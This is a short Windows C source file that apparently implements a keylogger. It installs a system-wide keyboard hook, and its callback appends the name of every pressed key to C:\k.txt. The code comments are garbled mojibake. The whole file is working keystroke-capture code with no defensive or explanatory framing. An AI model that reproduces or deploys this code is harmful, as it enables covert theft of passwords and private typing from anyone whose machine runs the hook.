#include"key.h"
BOOL InstallHook() {
	g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle(L"Key"), 0);
	return TRUE;
}
BOOL UninstallHook() {
	return UnhookWindowsHookEx(g_hHook);

}
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0 || nCode == HC_NOREMOVE)
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	if (lParam & 0x40000000)
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	//��ȡ����������
	char szKeyName[100];
	GetKeyNameTextA(lParam, szKeyName, 100);
	//���ļ�
	FILE* fp;
	if (fopen_s(&fp, "C:\\k.txt", "a") != 0 || fp == NULL) {
		printf("Error opening file.\n");
		return -1; // ���������ʵ��Ĵ�����ʽ
	}

	//д���ļ�
	char szWriteText[100] = {0};
	sprintf_s(szWriteText, "%s\r\n", szKeyName);


	fwrite(szWriteText, 1, strlen(szWriteText), fp);
	//�ر��ļ�
	fclose(fp);
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);


}